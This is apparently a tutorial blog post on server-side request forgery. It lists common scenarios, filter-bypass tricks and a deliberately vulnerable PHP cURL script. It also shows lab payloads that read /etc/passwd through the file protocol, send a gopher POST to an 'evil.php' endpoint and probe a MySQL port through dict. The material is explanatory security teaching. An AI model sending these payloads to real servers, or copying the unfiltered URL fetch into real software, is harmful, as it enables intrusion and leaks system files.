# SSRF Server-Side Request Forgery

The `SSRF` server-side request forgery vulnerability, also known as `XSPA` cross-site port attack, is a security vulnerability in which an attacker constructs exploitative code that causes the server to initiate exploit requests. In general, the applications targeted by `SSRF` attacks cannot be accessed from the external network, so attackers need to leverage the target server to initiate the attack. The target server may have access to both the internal and external networks, allowing attackers to exploit internal network applications through the target host.

## Description
`SSRF` involves forging server-side requests to bypass client data limitations. Typically, attackers interact with the internal network by forging server requests, thereby gaining access to and potentially attacking the internal network. `SSRF` is often combined with various attack methods. The SSRF attack uses insecure servers within a domain as proxies, which is similar to cross-site request forgery attacks using web clients. For example, browsers within a domain can act as proxies for attackers. In some cases, server-side programs need to retrieve data from other server applications, such as retrieving images and data. However, if the server does not filter or restrict the target addresses of its requests, hackers can exploit this loophole to request arbitrary server resources, including applications hidden within the internal network. Many believe that servers within the internal network are immune to hacker attacks and thus neglect to patch vulnerabilities or perform version upgrades. The prevalence of weak passwords within the internal network renders it vulnerable to exploitation through `SSRF`. While `SSRF` vulnerabilities typically appear in the context of `HTTP/HTTPS`, similar vulnerabilities can also be found in `TCP Connect`, which can be used to detect the activity status of internal network IPs and the availability of open ports, although the impact of such vulnerability is relatively small.

### Common Scenarios for SSRF Vulnerabilities
Any place that can initiate network requests to the external network may potentially contain an `SSRF` vulnerability.
* Remote server resource requests such as `Upload from URL, Import & Export RSS Feed`.
* Built-in database features in `Oracle, MongoDB, MSSQL, Postgres, CouchDB`.
* Receiving emails from other mail servers in `Webmail` such as `POP3, IMAP, SMTP`.
* File processing, encoding, and metadata handling in applications like `ffmpeg, ImageMagic, DOCX, PDF, XML`.
* Sharing web pages via `URL` addresses.
* Unpublished `API` implementations and other functionalities that use `URL` calls.

### Exploitation of SSRF Vulnerabilities
* Scanning ports on the external network, server's internal network, and local system to retrieve service `banner` information.
* Attacking applications running on the internal network or locally, such as overflow attacks.
* Fingerprinting internal `web` applications by accessing default files.
* Attacking `web` applications both internally and externally using `GET` parameters, such as `Struts2` and `sqli`.
* Reading local files using the `file` protocol, and other such exploits.

### Bypass Techniques
#### Localhost Attack

```
http://127.0.0.1:80
http://localhost:22
```

#### Utilizing @ Symbol to Bypass

```
http://example.com@127.0.0.1
# Here, example.com can be replaced with any domain.
```

#### Shortened URL to Bypass

```
http://127.0.0.1 can be transformed into http://suo.im/5UHEvD
# There are several URL shortening services available, such as http://tool.chinaz.com/tools/dwz.aspx
```

#### Special Domain Name Bypass

```
http://127.0.0.1.xip.io/
http://www.margin.com.127.0.0.1.xip.io/
```

#### Utilizing Enclosed Alphanumerics

```
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ 
⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```

#### Use period replace dot to bypass

```
127.0.0.1 becomes 127。0。0。1
```

#### Bypass using other bases

```
127.0.0.1
Octal format: 0177.0.0.1
Hexadecimal format: 0x7F.0.0.1
Decimal integer format: 2130706433 (convert to hexadecimal, then convert to decimal)
Hexadecimal integer format: 0x7F000001
There is also a special abbreviation mode, for example, the IP 127.0.0.1 can be written as 127.1, and the IP 10.0.0.1 can be written as 10.1
```

#### Special domain name bypass

```
DNS resolution
http://127.0.0.1.xip.io/
# Will resolve to the local 127.0.0.1
```

## Experimental target machine example
Using `PHP` to build a target machine as an example, write the following code in `test.php`, in fact, an important principle to avoid this type of attack is to filter user input and never trust user input.

```php
<?php
// Create a new cURL resource
$ch = curl_init();
// Set the URL and related options
curl_setopt($ch, CURLOPT_URL, $_GET['url']);
curl_setopt($ch, CURLOPT_HEADER, false);
// Fetch the URL and pass it to the browser
curl_exec($ch);
// Close cURL resources and release system resources
curl_close($ch);
```

### Use of file protocol
In the above example, sending a `GET` request can obtain sensitive file information.

```
http://192.168.163.150/test.php?url=file:///etc/passwd
```


### Use of gopher protocol
The `gopher` protocol was introduced earlier than the `http` protocol and is now not commonly used, but in the exploitation of `SSRF` vulnerabilities, `gopher` can be considered versatile because it can use `gopher` to send requests in various formats, solving the problem of the vulnerability not being in the `GET` parameter.   
Basic protocol format: `URL:gopher://<host>:<port>/<gopher-path>`.  
The following request can send a `POST` request, with the value of the parameter `cmd` being `balabal`. When constructing the `gopher` request, you need to double URL encode the line feed and carriage return `%250d%250a`.

```
http://192.168.163.150/test.php?url=gopher://192.168.163.1:80/_POST%20/evil.php%20HTTP/1.1%250d%250aHost:%20192.168.163.1%250d%250aUser-Agent:%20curl/7.43.0%250d%250aAccept:%20*/*%250d%250aContent-Type:%20application/x-www-form-urlencoded%250d%250a%250d%250acmd=balabala
```

### Application of dict protocol
The `dict` protocol is a dictionary server protocol, usually used to allow clients to access more dictionary sources during use. However, in `SSRF`, if you can use the `dict` protocol, you can easily obtain information about the services running on the target server port, such as service versions.

```
http://192.168.163.150/test.php?url=dict://192.168.163.1:3306/info 
```

## Daily Question

```
https://github.com/WindrunnerMax/EveryDay
```

## References

```
https://zhuanlan.zhihu.com/p/116039804
https://www.freebuf.com/column/157466.html
https://juejin.cn/post/6844903824948199431
https://www.cnblogs.com/bmjoker/p/9614789.html
https://blog.csdn.net/nz9611/article/details/96011013
https://zh.wikipedia.org/wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0
```